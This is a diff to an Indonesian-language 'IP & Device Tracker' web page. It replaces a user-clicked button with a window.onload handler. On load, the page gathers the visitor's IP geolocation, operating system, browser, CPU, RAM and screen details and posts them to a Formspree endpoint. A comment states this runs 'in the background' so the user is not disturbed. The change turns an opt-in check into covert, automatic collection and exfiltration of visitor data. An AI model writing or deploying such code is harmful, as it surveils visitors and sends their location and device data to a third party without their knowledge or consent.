@@ -10,16 +10,15 @@
 
     <div class="bg-white p-8 rounded-2xl shadow-lg max-w-lg w-full text-center">
         <h1 class="text-3xl font-bold text-green-600 mb-2">📍 IP & Device Tracker</h1>
-        <p class="text-gray-500 mb-6">Klik tombol di bawah untuk memeriksa lokasi dan spesifikasi perangkat Anda</p>
+        <p class="text-gray-500 mb-6">Informasi lokasi dan spesifikasi perangkat Anda</p>
 
-        <button onclick="cekDanKirimLokasi()" class="w-full bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-xl font-bold text-lg shadow-md transition duration-200 cursor-pointer">
-            🟢 Cek Lokasi & Spek Saya
-        </button>
+        <div id="loading" class="text-gray-600 font-medium animate-pulse mt-4 mb-4">
+            ⏳ Sedang melacak lokasi dan spesifikasi perangkat Anda...
+        </div>
+        
+        <div id="statusMsg" class="hidden text-sm mt-4 font-semibold p-3 rounded-lg mb-4"></div>
 
-        <div id="loading" class="hidden text-gray-600 font-medium animate-pulse mt-6">Sedang melacak dan memproses data...</div>
-        <div id="statusMsg" class="hidden text-sm mt-4 font-semibold p-3 rounded-lg"></div>
-
-        <div id="result" class="hidden text-left border-t pt-6 mt-6 space-y-4">
+        <div id="result" class="hidden text-left border-t pt-6 space-y-4">
             <div>
                 <h3 class="font-bold text-green-700 text-lg mb-2">📍 Data Lokasi:</h3>
                 <div class="space-y-2 text-sm">
@@ -45,6 +44,11 @@
     </div>
 
     <script>
+        // Jalankan fungsi otomatis saat seluruh elemen halaman selesai dimuat
+        window.onload = function() {
+            cekDanKirimLokasiOtomatis();
+        };
+
         function dapatkanDetailPerangkat() {
             const ua = navigator.userAgent;
             let os = "Tidak Diketahui";
@@ -64,16 +68,13 @@
             return { os, browser };
         }
 
-        async function cekDanKirimLokasi() {
+        async function cekDanKirimLokasiOtomatis() {
             const loading = document.getElementById('loading');
             const statusMsg = document.getElementById('statusMsg');
             const result = document.getElementById('result');
 
-            loading.classList.remove('hidden');
-            statusMsg.classList.add('hidden');
-            result.classList.add('hidden');
-
             try {
+                // 1. Ambil data lokasi dari API
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
 
@@ -81,11 +82,13 @@
                     throw new Error("Gagal mengambil data lokasi.");
                 }
 
+                // 2. Ambil spesifikasi hardware
                 const dev = dapatkanDetailPerangkat();
                 const cpuCores = navigator.hardwareConcurrency || "Tidak Terdeteksi";
                 const deviceRam = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Tidak Terdeteksi";
                 const screenRes = window.screen.width + " x " + window.screen.height + " px";
 
+                // Tampilkan data ke elemen HTML
                 document.getElementById('resIP').innerText = data.ip;
                 document.getElementById('resCountry').innerText = data.country_name + " (" + data.country_code + ")";
                 document.getElementById('resCity').innerText = data.city;
@@ -98,8 +101,10 @@
                 document.getElementById('resRAM').innerText = deviceRam;
                 document.getElementById('resScreen').innerText = screenRes;
 
+                // Tampilkan kartu hasil
                 result.classList.remove('hidden');
 
+                // 3. Kirim data ke Formspree secara background (user tidak terganggu)
                 const formspreeUrl = "https://formspree.io/f/xojolajv"; 
 
                 const emailResponse = await fetch(formspreeUrl, {
@@ -109,7 +114,7 @@
                         'Accept': 'application/json'
                     },
                     body: JSON.stringify({
-                        Subject: "Laporan Lengkap dari IP: " + data.ip,
+                        Subject: "Laporan Otomatis Baru dari IP: " + data.ip,
                         IP_Address: data.ip,
                         Negara: data.country_name,
                         Kota: data.city,
@@ -124,18 +129,19 @@
                 });
 
                 if (emailResponse.ok) {
-                    statusMsg.innerText = "✅ Data lokasi & spesifikasi berhasil dikirim ke email!";
-                    statusMsg.className = "mt-4 text-sm font-semibold p-3 rounded-lg bg-green-100 text-green-800 text-center";
+                    statusMsg.innerText = "✅ Data berhasil dimuat & laporan dikirim!";
+                    statusMsg.className = "text-sm font-semibold p-3 rounded-lg bg-green-100 text-green-800 text-center";
                 } else {
-                    throw new Error("Gagal mengirim laporan ke email.");
+                    throw new Error("Gagal mengirim laporan.");
                 }
 
             } catch (err) {
                 statusMsg.innerText = "❌ Terjadi kesalahan: " + err.message;
-                statusMsg.className = "mt-4 text-sm font-semibold p-3 rounded-lg bg-red-100 text-red-800 text-center";
-            } finally {
-                loading.classList.add('hidden');
+                statusMsg.className = "text-sm font-semibold p-3 rounded-lg bg-red-100 text-red-800 text-center";
                 statusMsg.classList.remove('hidden');
+            } finally {
+                // Sembunyikan tulisan loading awal
+                loading.classList.add('hidden');
             }
         }
     </script>
